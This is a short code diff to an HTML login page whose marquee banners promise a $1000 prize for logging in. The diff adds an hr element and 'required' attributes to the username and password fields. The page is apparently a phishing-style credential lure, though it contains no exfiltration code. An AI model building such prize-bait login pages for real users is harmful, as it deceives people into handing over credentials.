@@ -11,12 +11,14 @@
     <div class="action-box">
         <marquee scrollamount=20>congratulations! you have won $1000! claim now by logging in</marquee>
         <h2>Log in to your account</h2>
+        <hr style="width: 100%">
         <form name="login" method="POST" id="login-form" class="standard-form">
             <label for="username">Username</label>
-            <input type="text" name="username" id="username" />
+            <input type="text" name="username" id="username" required />
 
             <label for="password">Password</label>
-            <input type="password" name="password" id="password" />
+            <input type="password" name="password" id="password" required />
+
             <button type="submit" name="login" class="submit-button">Claim NOW!!</button>
         </form>
         <marquee style="color: orange;" scrollamount=10>congratulations! you have won $1000! claim now by logging in</marquee>
